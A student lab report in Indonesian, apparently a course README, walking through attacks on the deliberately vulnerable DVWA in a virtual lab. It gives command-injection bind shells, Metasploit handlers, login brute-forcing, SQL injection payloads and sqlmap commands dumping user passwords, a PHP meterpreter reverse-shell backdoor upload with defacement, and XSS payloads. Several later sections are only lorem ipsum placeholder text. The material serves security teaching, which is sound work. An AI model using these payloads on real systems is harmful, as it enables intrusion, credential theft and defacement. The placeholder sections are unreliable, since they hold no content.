# Anggota Kelompok 9

1. 5114100031 ANDRE EXAUDI JEREMY RUMAPEA
2. 5114100043 JEFFRY NASRI FARUKI
3. 5114100073 HENDRA DARMAWAN

# Daftar Isi
1. [DVWA](#dvwa)
* [Konfigurasi](#konfigurasi)
* [Lesson-4](#lesson-4-using-metasploit-with-command-execution)
* [Lesson-5](#lesson-5-using-tamper-data-with-crack_web_formpl)
* [Lesson-6](#lesson-6-manual-sql-injection-john-the-ripper)
* [Lesson-7](#lesson-7-automate-sql-injection-with-sqlmap)
* [Lesson-8](#lesson-8-upload-php-backdoor-payload)
* [Lesson-9](#lesson-9-cross-site-scripting-xss)
* [Lesson-10](#lesson-10-cross-site-request-forgery-combined-with-curl)
2. [Cuckoo](#cuckoo)
* [Instalasi](#instalasi)
* [Konfigurasi](#konfigurasi-1)
* [Testing](#testing-1)
3. [Snort](#snort)
* [Instalasi](#instalasi-1)
* [Konfigurasi](#konfigurasi-2)
* [Testing](#testing-2)

# Pendahuluan

Dalam laporan berisi cara penggunaan DVWA, Cuckoo dan Snort. DVWA adalah singkatan dari Damn Vulnerable Web Application, DVWA sendiri merupakan sebuah website yang sudah dirancang sedemikian rupa sehingga memiliki banyak celah keamanan untuk di explore. Cuckoo adalah sistem penganalisa malware. Snort adalah sistem penganalisa paket. Laporan ini akan berisi instalasi,konfigurasi dan beberapa seknario percobaan masing-masing aplikasi tersebut

# DVWA
Prerequisite:
1. Iso Backtrack 5 GNOME 64 bit
2. Iso Metasploitable-linux-2.0.0
3. Iso Ubuntu Dekstop 16.04
4. Windows 7/8/10
## Konfigurasi

1. Buat DHCP server pada VMWare dengan mengetikkan perintah berikut di cmd
```
VBoxManage dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.100 --upperip 10.0.1.200  --enable
```
Ket = perintah di atas akan memberi ip address dalam rentang 10.0.1.100 sampai 10.0.1.200
2. Setting Network Virtual OS Metsploitable
Klik Kanan Virtual OS -> Setting -> Buka Tab Network -> isi Attached Netwrok : Internal Network dan Name : intnet(nama dhcp server Langkah 1)

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/1.PNG)

Jika Berhasil , maka akan didapatkan ip dalam rentang 10.0.1.100 sampai 10.0.1.200 :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/2.PNG)

3. Lakukan Hal tersebut pada Virtual OS backtrack dan viertual OS ubuntu
4. Setting security DVWA menjadi Low
Buka ip Virtual OS metasploitable pada browser di virtual OS Ubuntu. contoh = 10.0.1.100/dvwa

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/3.PNG)

Login dengan username : admin , password : password

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/4.PNG)

Klik Tab DVWA Security, Pilih Low, SUBMIT

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/5.PNG)
## Testing
### Lesson 4: Using Metasploit with Command Execution

1. Jalankan Netcat pada Metasploit
Klik tab Command Execution

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/6.PNG)

Jalankan perintah
```
http://10.0.1.100;mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
```
Ket = 10.0.1.100 -> ip Metasploitable
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/7.PNG)

2. Start VIrtual OS backtrack, login dengan username : root, password: toor
3. Buka start Menu ->BackTrack->Exploitation Tools->Network Exploitation tool->Metasploit Framework -> msf console
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/8.PNG)

4. Jalankan perintah-perintah berikut secara bergantian
```
use multi/handler
set PAYLOAD linux/x86/shell/bind_tcp
show options
set RHOST 10.0.1.100
```

5. Jalankan perintah 
```
exploit
```

### Lesson 5: Using Tamper Data with crack_web_form.pl

1. Enable add on Tamper Data pada firefox di Backtrack
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/9.PNG)

2. Buka Halaman DVWA dengan firefox di Backtrack
3. Start Add on Tamper Data (Firefox->Tools->Tamper Data -> STart Tamper)

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/10.PNG)
4. Login dengan akun username : admin dan password : password pada halaman DVWA
5. AKan muncul notifikasi Sumbit tamper data. Uncheck textbox dan klik submit

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/11.PNG)

6. Copy data POSTDATA dalam REQUEST HEADER padasalah satu data yang method-nya POST

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/12.PNG)

7. copy data tersebut pada notepad
8. Login sekali lagi dengan username dan password yang salah
9. AKan muncul tulisan Login FAiled . masukkan tulisan ini pada notepad sebelumnya bersamaan dengan data POSTDATA
10. Buat direktory pentest/password/cwf
11. download http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz , masukkan dalam folder tersebut
12. JALankan perintah-perintah berikut secara berurutan
```
    cd /pentest/passwords/cwf
    ls -l
    tar xovfz cwf.tar.gz
    chmod 700 crack_web_form.pl
```
13. Jalankan perintah :
```
./crack_web_form.pl -U admin -P password.txt -http "10.0.1.100/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Login failed"
```
Ket: 10.0.1.100->IP metasploitable

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/13.PNG)
### Lesson 6: Manual SQL Injection, John the Ripper

1. Login KE DVWA. Buka menu SQL Injection
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/14.PNG)
2. Skenario Basic Injection
Masukkan perintah berikut di kolom SQL Injection
```
1
```
3. Skenario Always True
Masukkan perintah berikut di kolom SQL Injection
```
%' or '0'='0
```
4. Menampilkan versi Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, version() #
```
5. Menampilkan User Database 
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, user() #
```
6. Menampilkan Nama Database
Masukkan perintah berikut di kolom SQL Injection
```
%' or 0=0 union select null, database() #
```
7. Menampilkan semua tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables #
```
8. Menampilkan semua pengguna di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%'#
```
9. Menmpilkan kolom di tabel information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
```
10. Menampilkan kolom dan konten tabel di information_schema
Masukkan perintah berikut di kolom SQL Injection
```
%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #
```
11. Membuat password hash file
Data yang didapatkan dari langkah ke-10 simpan di notepad taruh di folder /pentest/password/john dengan format seperti gambar di bawah

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/15.PNG)

Jalankan perintah berikut untuk mencrypt password yg terenkripsi
```
cd /pentest/passwords/john
./john --format=raw-MD5 dvwa_password.txt
```



### Lesson 7: Automate SQL Injection with SqlMap

1. Login ke DVWA dan buka menu SQL INjection
2. Start add On tamper data
3. MAsukkan angka 1 di kolom sql injection, maka akan muncul notifikasi submit. uncheck checkbox
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/16.PNG)
4. Catat data REferrer dan data Cookiedari salah satu paket GET
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/17.PNG)
5. Buka folder SQLMAP pada terminal dengan mengetik
```
cd /pentest/web/scanners/sqlmap
```
6. Menggunakan sqlmap meandapatkan database dan user yang digunakan
```
/sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -b --current-db --current-user
```
Ket : sesuaikan data dengan langkah ke 4

jika ada pemrtanyaan, pilih yes. Setelah proses selesai, hasilnya kan sepertin ini :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/18.PNG)

Data tersebut merupakan database yang sedang digunakan

8. Menggunakan sqlmap untuk dapatkan semua database yang ada

Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" --dbs
```
Ket : sesuaikan data dengan langkah ke 4

Jika berhasil maka akan seperti gambar di bawah ini :

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/19.PNG)

9. MEnggunakan sqlmap untuk dapatkan isi username dan password database DVWA
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa --tables
```
Ket : sesuaikan data dengan langkah ke 4

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/20.PNG)
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users --columns
```
Ket : sesuaikan data dengan langkah ke 4
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/21.PNG)
Jalankan perintah :
```
./sqlmap.py -u "http://10.0.1.100/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=lpb5g4uss9kp70p8jccjeks621; security=low" -D dvwa -T users -C user,password --dump
```
Ket : sesuaikan data dengan langkah ke 4
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/22.PNG)
### Lesson 8: Upload PHP Backdoor Payload

1. Jalankan perintah :
```

    mkdir -p /root/backdoor
    cd /root/backdoor
    msfpayload php/meterpreter/reverse_tcp LHOST=10.0.1.102 LPORT=4444 R > PHONE_HOME.php
    ls -l PHONE_HOME.php

```
Ket = 10.0.1.102 ip backtrack

2. Buka file PHONE_HOME.php , dan hilangkan tanda # di baris awal file
3. Buka terminal dan ketikkan msfconsole
4. Jalankan perintah berikut
```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.1.102
set LPORT 4444
exploit
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/23.PNG)

5. Login ke DVWA, Masuk ke menu Upload. dan upload PHONE_HOME.php. Jika berhasil akan seperti gambar :
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/24.PNG)

6. Buka http://10.0.1.100/dvwa/hackable/uploads/ dan klik PHONE_HOME.php. Jika berhasil akan seperti gambar

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/25.PNG)

7. Jalankan perintah :
```
    shell        
    uptime
    pwd
    whoami
    w
    echo "Hacked By PKSJ" > hacked.html
    ls -l
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/26.PNG)
8. Jika berhasil maka file hacked.html sudah ada di DVWA

![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/27.PNG)
### Lesson 9: Cross Site Scripting (XSS)

1. Ubah limit script guna melancarkan aksi
Buka metasploitable dan ketikkan perintah berikut :
```
cd /var/www/dvwa/vulnerabilities/xss_s/
vi index.php
```
cari kata mtxMessage di vi dengan mengetik kan:
```
/mtxMessage
```
ubah maxlength yang awalnya 50 mejadi 250

2. Di firefox BAcktrack  matikan fitur BLOCK POP UP WINDOWS dan nyalakan fitur ENABLE JAVASCRIPT
3. SKenario expolit IFRAME di XSS STORED
Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 2
    Message: <iframe src="http://www.cnn.com"></iframe>
    Click Sign Guestbook
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/28.PNG)

4. SKenario expolit COOKIE di XSS STORED
Login ke DVWA buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 3
    Message: <script>alert(document.cookie)</script>
    Click Sign Guestbook
```
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/29.PNG)
5. SKenario expolit windows.location di XSS STORED
Ketikkan perintah berikut
```
mkdir -p /root/backdoor
cd /root/backdoor
msfpayload php/meterpreter/reverse_tcp LHOST=10.0.100.102 LPORT=4444 R > FORUM_BUG.php 
```
Hilangkan tanda # di file FORUM_BUG.php
Login ke DVWA buka menu upload, upload file FORUM_BUG.php
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/30.PNG)
Buka msfconsole dan ketikkan perintah berikut
```
use exploit/multi/handler
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.100.102
set LPORT 4444
exploit 
```
buka menu XSS STORED. ISi seperti di bawah ini :
```
    Name: Test 4
    Message:

    <script>window.location="http://192.168.1.106/dvwa/hackable/uploads/FORUM_BUG.php" </script>
        Replace 192.168.1.106 with the IP Address obtain from Fedora 14 in (Section 3, Step 3).

    Click Sign Guestbook
```
Jika berhasil , maka di msf console akan berubah jadi gambar berikut :
![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/31.PNG)
### Lesson 10: Cross Site Request Forgery combined with Curl

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# CUCKOO
## Instalasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Konfigurasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Testing

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# SNORT
## Instalasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Konfigurasi

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

## Testing

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

### membaca pcap dari SECREPO (Security Data Samples Repository)

"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."

# Refrensi
  * http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=688b0913be93a4d95daed400990c4745&TYPE=SUB
  
